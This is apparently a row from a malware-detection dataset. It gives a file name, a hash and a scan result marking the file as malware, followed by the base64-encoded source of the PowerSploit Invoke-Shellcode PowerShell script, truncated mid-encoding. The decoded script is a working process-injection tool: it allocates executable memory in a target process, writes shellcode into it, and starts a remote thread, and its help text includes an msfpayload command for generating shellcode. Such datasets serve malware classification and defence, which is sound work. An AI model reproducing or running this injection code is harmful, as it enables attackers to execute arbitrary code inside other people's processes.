Invoke-Shellcode.ps1,569eb331b3f1c44f436d26b2981f4ea1,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVNoZWxsY29kZQoKewoKPCMKCi5TWU5PUFNJUwoKCgpJbmplY3Qgc2hlbGxjb2RlIGludG8gdGhlIHByb2Nlc3MgSUQgb2YgeW91ciBjaG9vc2luZyBvciB3aXRoaW4gdGhlIGNvbnRleHQgb2YgdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzLgoKCgpQb3dlclNwbG9pdCBGdW5jdGlvbjogSW52b2tlLVNoZWxsY29kZQoKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZQoKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lCgpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKCiAKCi5ERVNDUklQVElPTgoKCgpQb3J0aW9ucyBvZiB0aGlzIHByb2plY3Qgd2FzIGJhc2VkIHVwb24gc3lyaW5nZS5jIHYxLjIgd3JpdHRlbiBieSBTcGVuY2VyIE1jSW50eXJlCgoKClBvd2VyU2hlbGwgZXhwZWN0cyBzaGVsbGNvZGUgdG8gYmUgaW4gdGhlIGZvcm0gMHhYWCwweFhYLDB4WFguIFRvIGdlbmVyYXRlIHlvdXIgc2hlbGxjb2RlIGluIHRoaXMgZm9ybSwgeW91IGNhbiB1c2UgdGhpcyBjb21tYW5kIGZyb20gd2l0aGluIEJhY2t0cmFjayAoVGhhbmtzLCBNYXR0IGFuZCBnMHRtMWxrKToKCgoKbXNmcGF5bG9hZCB3aW5kb3dzL2V4ZWMgQ01EPSJjbWQgL2sgY2FsYyIgRVhJVEZVTkM9dGhyZWFkIEMgfCBzZWQgJzEsNmQ7cy9bIjtdLy9nO3MvXFwvLDAvZycgfCB0ciAtZCAnXG4nIHwgY3V0IC1jMi0gCgoKCk1ha2Ugc3VyZSB0byBzcGVjaWZ5ICd0aHJlYWQnIGZvciB5b3VyIGV4aXQgcHJvY2Vzcy4gQWxzbywgZG9uJ3QgYm90aGVyIGVuY29kaW5nIHlvdXIgc2hlbGxjb2RlLiBJdCdzIGVudGlyZWx5IHVubmVjZXNzYXJ5LgoKIAoKLlBBUkFNRVRFUiBQcm9jZXNzSUQKCgoKUHJvY2VzcyBJRCBvZiB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3Qgc2hlbGxjb2RlIGludG8uCgoKCi5QQVJBTUVURVIgU2hlbGxjb2RlCgoKClNwZWNpZmllcyBhbiBvcHRpb25hbCBzaGVsbGNvZGUgcGFzc2VkIGluIGFzIGEgYnl0ZSBhcnJheQoKCgouUEFSQU1FVEVSIEZvcmNlCgoKCkluamVjdHMgc2hlbGxjb2RlIHdpdGhvdXQgcHJvbXB0aW5nIGZvciBjb25maXJtYXRpb24uIEJ5IGRlZmF1bHQsIEludm9rZS1TaGVsbGNvZGUgcHJvbXB0cyBmb3IgY29uZmlybWF0aW9uIGJlZm9yZSBwZXJmb3JtaW5nIGFueSBtYWxpY2lvdXMgYWN0LgoKCgouRVhBTVBMRQoKCgpDOlxQUz4gSW52b2tlLVNoZWxsY29kZSAtUHJvY2Vzc0lkIDQyNzQKCgoKRGVzY3JpcHRpb24KCi0tLS0tLS0tLS0tCgpJbmplY3Qgc2hlbGxjb2RlIGludG8gcHJvY2VzcyBJRCA0Mjc0LgoKCgouRVhBTVBMRQoKCgpDOlxQUz4gSW52b2tlLVNoZWxsY29kZQoKCgpEZXNjcmlwdGlvbgoKLS0tLS0tLS0tLS0KCkluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgcnVubmluZyBpbnN0YW5jZSBvZiBQb3dlclNoZWxsLgoKCgouRVhBTVBMRQoKCgpDOlxQUz4gSW52b2tlLVNoZWxsY29kZSAtU2hlbGxjb2RlIEAoMHg5MCwweDkwLDB4QzMpCgogICAgCgpEZXNjcmlwdGlvbgoKLS0tLS0tLS0tLS0KCk92ZXJyaWRlcyB0aGUgc2hlbGxjb2RlIGluY2x1ZGVkIGluIHRoZSBzY3JpcHQgd2l0aCBjdXN0b20gc2hlbGxjb2RlIC0gMHg5MCAoTk9QKSwgMHg5MCAoTk9QKSwgMHhDMyAoUkVUKQoKV2FybmluZzogVGhpcyBzY3JpcHQgaGFzIG5vIHdheSB0byB2YWxpZGF0ZSB0aGF0IHlvdXIgc2hlbGxjb2RlIGlzIDMyIHZzLiA2NC1iaXQhCgojPgoKCgpbQ21kbGV0QmluZGluZyggRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnUnVuTG9jYWwnLCBTdXBwb3J0c1Nob3VsZFByb2Nlc3MgPSAkVHJ1ZSAsIENvbmZpcm1JbXBhY3QgPSAnSGlnaCcpXSBQYXJhbSAoCgogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KCiAgICBbVUludDE2XQoKICAgICRQcm9jZXNzSUQsCgogICAgCgogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdSdW5Mb2NhbCcgKV0KCiAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQoKICAgIFtCeXRlW11dCgogICAgJFNoZWxsY29kZSwKCiAgICAKCiAgICBbU3dpdGNoXQoKICAgICRGb3JjZSA9ICRGYWxzZQoKKQoKCgogICAgU2V0LVN0cmljdE1vZGUgLVZlcnNpb24gMi4wCgoKCiAgICBpZiAoICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc0lEJ10gKQoKICAgIHsKCiAgICAgICAgIyBFbnN1cmUgYSB2YWxpZCBwcm9jZXNzIElEIHdhcyBwcm92aWRlZAoKICAgICAgICAjIFRoaXMgY291bGQgaGF2ZSBiZWVuIHZhbGlkYXRlZCB2aWEgJ1ZhbGlkYXRlU2NyaXB0JyBidXQgdGhlIGVycm9yIGdlbmVyYXRlZCB3aXRoIEdldC1Qcm9jZXNzIGlzIG1vcmUgZGVzY3JpcHRpdmUKCiAgICAgICAgR2V0LVByb2Nlc3MgLUlkICRQcm9jZXNzSUQgLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbAoKICAgIH0KCiAgICAKCiAgICBmdW5jdGlvbiBMb2NhbDpHZXQtRGVsZWdhdGVUeXBlCgogICAgewoKICAgICAgICBQYXJhbQoKICAgICAgICAoCgogICAgICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQoKICAgICAgICAgICAgCgogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDApXQoKICAgICAgICAgICAgW1R5cGVbXV0KCiAgICAgICAgICAgICRQYXJhbWV0ZXJzID0gKE5ldy1PYmplY3QgVHlwZVtdKDApKSwKCiAgICAgICAgICAgIAoKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxICldCgogICAgICAgICAgICBbVHlwZV0KCiAgICAgICAgICAgICRSZXR1cm5UeXBlID0gW1ZvaWRdCgogICAgICAgICkKCgoKICAgICAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KCiAgICAgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykKCiAgICAgICAgJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5Bc3NlbWJseSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKQoKICAgICAgICAkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpCgogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVDb25zdHJ1Y3RvcignUlRTcGVjaWFsTmFtZSwgSGlkZUJ5U2lnLCBQdWJsaWMnLCBbU3lzdGVtLlJlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsICRQYXJhbWV0ZXJzKQoKICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQoKICAgICAgICAkTWV0aG9kQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRSZXR1cm5UeXBlLCAkUGFyYW1ldGVycykKCiAgICAgICAgJE1ldGhvZEJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCgogICAgICAgIAoKICAgICAgICBXcml0ZS1PdXRwdXQgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoKICAgIH0KCgoKICAgIGZ1bmN0aW9uIExvY2FsOkdldC1Qcm9jQWRkcmVzcwoKICAgIHsKCiAgICAgICAgUGFyYW0KCiAgICAgICAgKAoKICAgICAgICAgICAgW091dHB1dFR5cGUoW0ludFB0cl0pXQoKICAgICAgICAKCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KCiAgICAgICAgICAgIFtTdHJpbmddCgogICAgICAgICAgICAkTW9kdWxlLAoKICAgICAgICAgICAgCgogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCgogICAgICAgICAgICBbU3RyaW5nXQoKICAgICAgICAgICAgJFByb2NlZHVyZQoKICAgICAgICApCgoKCiAgICAgICAgIyBHZXQgYSByZWZlcmVuY2UgdG8gU3lzdGVtLmRsbCBpbiB0aGUgR0FDCgogICAgICAgICRTeXN0ZW1Bc3NlbWJseSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8CgogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoJ1xcJylbLTFdLkVxdWFscygnU3lzdGVtLmRsbCcpIH0KCiAgICAgICAgJFVuc2FmZU5hdGl2ZU1ldGhvZHMgPSAkU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoKICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byB0aGUgR2V0TW9kdWxlSGFuZGxlIGFuZCBHZXRQcm9jQWRkcmVzcyBtZXRob2RzCgogICAgICAgICRHZXRNb2R1bGVIYW5kbGUgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpCgogICAgICAgICRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQoKICAgICAgICAjIEdldCBhIGhhbmRsZSB0byB0aGUgbW9kdWxlIHNwZWNpZmllZAoKICAgICAgICAkS2VybjMySGFuZGxlID0gJEdldE1vZHVsZUhhbmRsZS5JbnZva2UoJG51bGwsIEAoJE1vZHVsZSkpCgogICAgICAgICR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cgoKICAgICAgICAkSGFuZGxlUmVmID0gTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKCR0bXBQdHIsICRLZXJuMzJIYW5kbGUpCgogICAgICAgIAoKICAgICAgICAjIFJldHVybiB0aGUgYWRkcmVzcyBvZiB0aGUgZnVuY3Rpb24KCiAgICAgICAgV3JpdGUtT3V0cHV0ICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCgogICAgfQoKCgogICAgIyBFbWl0cyBhIHNoZWxsY29kZSBzdHViIHRoYXQgd2hlbiBpbmplY3RlZCB3aWxsIGNyZWF0ZSBhIHRocmVhZCBhbmQgcGFzcyBleGVjdXRpb24gdG8gdGhlIG1haW4gc2hlbGxjb2RlIHBheWxvYWQKCiAgICBmdW5jdGlvbiBMb2NhbDpFbWl0LUNhbGxUaHJlYWRTdHViIChbSW50UHRyXSAkQmFzZUFkZHIsIFtJbnRQdHJdICRFeGl0VGhyZWFkQWRkciwgW0ludF0gJEFyY2hpdGVjdHVyZSkKCiAgICB7CgogICAgICAgICRJbnRTaXplUHRyID0gJEFyY2hpdGVjdHVyZSAvIDgKCgoKICAgICAgICBmdW5jdGlvbiBMb2NhbDpDb252ZXJ0VG8tTGl0dGxlRW5kaWFuIChbSW50UHRyXSAkQWRkcmVzcykKCiAgICAgICAgewoKICAgICAgICAgICAgJExpdHRsZUVuZGlhbkJ5dGVBcnJheSA9IE5ldy1PYmplY3QgQnl0ZVtdKDApCgogICAgICAgICAgICAkQWRkcmVzcy5Ub1N0cmluZygiWCQoJEludFNpemVQdHIqMikiKSAtc3BsaXQgJyhbQS1GMC05XXsyfSknIHwgRm9yRWFjaC1PYmplY3QgeyBpZiAoJF8pIHsgJExpdHRsZUVuZGlhbkJ5dGVBcnJheSArPSBbQnl0ZV0gKCcweHswfScgLWYgJF8pIH0gfQoKICAgICAgICAgICAgW1N5c3RlbS5BcnJheV06OlJldmVyc2UoJExpdHRsZUVuZGlhbkJ5dGVBcnJheSkKCiAgICAgICAgICAgIAoKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkKCiAgICAgICAgfQoKICAgICAgICAKCiAgICAgICAgJENhbGxTdHViID0gTmV3LU9iamVjdCBCeXRlW10oMCkKCiAgICAgICAgCgogICAgICAgIGlmICgkSW50U2l6ZVB0ciAtZXEgOCkKCiAgICAgICAgewoKICAgICAgICAgICAgW0J5dGVbXV0gJENhbGxTdHViID0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgUVdPUkQgUkFYLCAmc2hlbGxjb2RlCgogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkQmFzZUFkZHIgICAgICAgIyAmc2hlbGxjb2RlCgogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBSQVgKCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDZBLDB4MDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFBVU0ggIEJZVEUgMAoKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NDgsMHhCOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgUVdPUkQgUkFYLCAmRXhpdFRocmVhZAoKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEV4aXRUaHJlYWRBZGRyICMgJkV4aXRUaHJlYWQKCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIFJBWAoKICAgICAgICB9CgogICAgICAgIGVsc2UKCiAgICAgICAgewoKICAgICAgICAgICAgW0J5dGVbXV0gJENhbGxTdHViID0gMHhCOCAgICAgICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgRFdPUkQgRUFYLCAmc2hlbGxjb2RlCgogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkQmFzZUFkZHIgICAgICAgIyAmc2hlbGxjb2RlCgogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBFQVgKCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDZBLDB4MDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFBVU0ggIEJZVEUgMAoKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4QjggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgRFdPUkQgRUFYLCAmRXhpdFRocmVhZAoKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEV4aXRUaHJlYWRBZGRyICMgJkV4aXRUaHJlYWQKCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIEVBWAoKICAgICAgICB9CgogICAgICAgIAoKICAgICAgICBXcml0ZS1PdXRwdXQgJENhbGxTdHViCgogICAgfQoKCgogICAgZnVuY3Rpb24gTG9jYWw6SW5qZWN0LVJlbW90ZVNoZWxsY29kZSAoW0ludF0gJFByb2Nlc3NJRCkKCiAgICB7CgogICAgICAgICMgT3BlbiBhIGhhbmRsZSB0byB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3QgaW50bwoKICAgICAgICAkaFByb2Nlc3MgPSAkT3BlblByb2Nlc3MuSW52b2tlKDB4MDAxRjBGRkYsICRmYWxzZSwgJFByb2Nlc3NJRCkgIyBQcm9jZXNzQWNjZXNzRmxhZ3MuQWxsICgweDAwMUYwRkZGKQoKICAgICAgICAKCiAgICAgICAgaWYgKCEkaFByb2Nlc3MpCgogICAgICAgIHsKCiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gb3BlbiBhIHByb2Nlc3MgaGFuZGxlIGZvciBQSUQ6ICRQcm9jZXNzSUQiCgogICAgICAgIH0KCgoKICAgICAgICAkSXNXb3c2NCA9ICRmYWxzZQoKCgogICAgICAgIGlmICgkNjRiaXRPUykgIyBPbmx5IHBlcmZvcm0gdGhlc2VzIGNoZWNrcyBpZiBDUFUgaXMgNjQtYml0CgogICAgICAgIHsKCiAgICAgICAgICAgICMgRGV0ZXJtaW5lIGlmIHRoZSBwcm9jZXNzIHNwZWNpZmllZCBpcyAzMiBvciA2NCBiaXQKCiAgICAgICAgICAgICRJc1dvdzY0UHJvY2Vzcy5JbnZva2UoJGhQcm9jZXNzLCBbUmVmXSAkSXNXb3c2NCkgfCBPdXQtTnVsbAoKICAgICAgICAgICAgCgogICAgICAgICAgICBpZiAoKCEkSXNXb3c2NCkgLWFuZCAkUG93ZXJTaGVsbDMyYml0KQoKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgIFRocm93ICdTaGVsbGNvZGUgaW5qZWN0aW9uIHRhcmdldGluZyBhIDY0LWJpdCBwcm9jZXNzIGZyb20gMzItYml0IFBvd2VyU2hlbGwgaXMgbm90IHN1cHBvcnRlZC4gVXNlIHRoZSA2NC1iaXQgdmVyc2lvbiBvZiBQb3dlcnNoZWxsIGlmIHlvdSB3YW50IHRoaXMgdG8gd29yay4nCgogICAgICAgICAgICB9CgogICAgICAgICAgICBlbHNlaWYgKCRJc1dvdzY0KSAjIDMyLWJpdCBXb3c2NCBwcm9jZXNzCgogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApCgogICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzIKCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdJbmplY3RpbmcgaW50byBhIFdvdzY0IHByb2Nlc3MuJwoKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZWxzZSAjIDY0LWJpdCBwcm9jZXNzCgogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApCgogICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGU2NCB2YXJpYWJsZSEnCgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlNjQKCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyA2NC1iaXQgc2hlbGxjb2RlLicKCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgICAgICBlbHNlICMgMzItYml0IENQVQoKICAgICAgICB7CgogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkKCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCgogICAgICAgICAgICB9CgogICAgICAgICAgICAKCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzIKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwoKICAgICAgICB9CgoKCiAgICAgICAgIyBSZXNlcnZlIGFuZCBjb21taXQgZW5vdWdoIG1lbW9yeSBpbiByZW1vdGUgcHJvY2VzcyB0byBob2xkIHRoZSBzaGVsbGNvZGUKCiAgICAgICAgJFJlbW90ZU1lbUFkZHIgPSAkVmlydHVhbEFsbG9jRXguSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQoKICAgICAgICAKCiAgICAgICAgaWYgKCEkUmVtb3RlTWVtQWRkcikKCiAgICAgICAgewoKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBzaGVsbGNvZGUgbWVtb3J5IGluIFBJRDogJFByb2Nlc3NJRCIKCiAgICAgICAgfQoKICAgICAgICAKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJFJlbW90ZU1lbUFkZHIuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKCgogICAgICAgICMgQ29weSBzaGVsbGNvZGUgaW50byB0aGUgcHJldmlvdXNseSBhbGxvY2F0ZWQgbWVtb3J5CgogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRoUHJvY2VzcywgJFJlbW90ZU1lbUFkZHIsICRTaGVsbGNvZGUsICRTaGVsbGNvZGUuTGVuZ3RoLCBbUmVmXSAwKSB8IE91dC1OdWxsCgoKCiAgICAgICAgIyBHZXQgYWRkcmVzcyBvZiBFeGl0VGhyZWFkIGZ1bmN0aW9uCgogICAgICAgICRFeGl0VGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRXhpdFRocmVhZAoKCgogICAgICAgIGlmICgkSXNXb3c2NCkKCiAgICAgICAgewoKICAgICAgICAgICAgIyBCdWlsZCAzMi1iaXQgaW5saW5lIGFzc2VtYmx5IHN0dWIgdG8gY2FsbCB0aGUgc2hlbGxjb2RlIHVwb24gY3JlYXRpb24gb2YgYSByZW1vdGUgdGhyZWFkLgoKICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkUmVtb3RlTWVtQWRkciAkRXhpdFRocmVhZEFkZHIgMzIKCiAgICAgICAgICAgIAoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgMzItYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCgogICAgICAgIH0KCiAgICAgICAgZWxzZQoKICAgICAgICB7CgogICAgICAgICAgICAjIEJ1aWxkIDY0LWJpdCBpbmxpbmUgYXNzZW1ibHkgc3R1YiB0byBjYWxsIHRoZSBzaGVsbGNvZGUgdXBvbiBjcmVhdGlvbiBvZiBhIHJlbW90ZSB0aHJlYWQuCgogICAgICAgICAgICAkQ2FsbFN0dWIgPSBFbWl0LUNhbGxUaHJlYWRTdHViICRSZW1vdGVNZW1BZGRyICRFeGl0VGhyZWFkQWRkciA2NAoKICAgICAgICAgICAgCgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyA2NC1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKCiAgICAgICAgfQoKCgogICAgICAgICMgQWxsb2NhdGUgaW5saW5lIGFzc2VtYmx5IHN0dWIKCiAgICAgICAgJFJlbW90ZVN0dWJBZGRyID0gJFZpcnR1YWxBbGxvY0V4Lkludm9rZSgkaFByb2Nlc3MsIFtJbnRQdHJdOjpaZXJvLCAkQ2FsbFN0dWIuTGVuZ3RoLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCgogICAgICAgIAoKICAgICAgICBpZiAoISRSZW1vdGVTdHViQWRkcikKCiAgICAgICAgewoKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSB0aHJlYWQgY2FsbCBzdHViIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCgogICAgICAgIH0KCiAgICAgICAgCgogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkUmVtb3RlU3R1YkFkZHIuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKCgogICAgICAgICMgV3JpdGUgMzItYml0IGFzc2VtYmx5IHN0dWIgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5IHNwYWNlCgogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRoUHJvY2VzcywgJFJlbW90ZVN0dWJBZGRyLCAkQ2FsbFN0dWIsICRDYWxsU3R1Yi5MZW5ndGgsIFtSZWZdIDApIHwgT3V0LU51bGwKCgoKICAgICAgICAjIEV4ZWN1dGUgc2hlbGxjb2RlIGFzIGEgcmVtb3RlIHRocmVhZAoKICAgICAgICAkVGhyZWFkSGFuZGxlID0gJENyZWF0ZVJlbW90ZVRocmVhZC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgMCwgJFJlbW90ZVN0dWJBZGRyLCAkUmVtb3RlTWVtQWRkciwgMCwgW0ludFB0cl06Olplcm8pCgogICAgICAgIAoKICAgICAgICBpZiAoISRUaHJlYWRIYW5kbGUpCgogICAgICAgIHsKCiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gbGF1bmNoIHJlbW90ZSB0aHJlYWQgaW4gUElEOiAkUHJvY2Vzc0lEIgoKICAgICAgICB9CgoKCiAgICAgICAgIyBDbG9zZSBwcm9jZXNzIGhhbmRsZQoKICAgICAgICAkQ2xvc2VIYW5kbGUuSW52b2tlKCRoUHJvY2VzcykgfCBPdXQtTnVsbAoKCgogICAgICAgIFdyaXRlLVZlcmJvc2UgJ1NoZWxsY29kZSBpbmplY3Rpb24gY29tcGxldGUhJwoKICAgIH0KCgoKICAgIGZ1bmN0aW9uIExvY2FsOkluamVjdC1Mb2NhbFNoZWxsY29kZQoKICAgIHsKCiAgICAgICAgaWYgKCRQb3dlclNoZWxsMzJiaXQpIHsKCiAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQoKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKCiAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIAoKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgMzItYml0IHNoZWxsY29kZS4nCgogICAgICAgIH0KCiAgICAgICAgZWxzZQoKICAgICAgICB7CgogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTY0Lkxlbmd0aCAtZXEgMCkKCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gd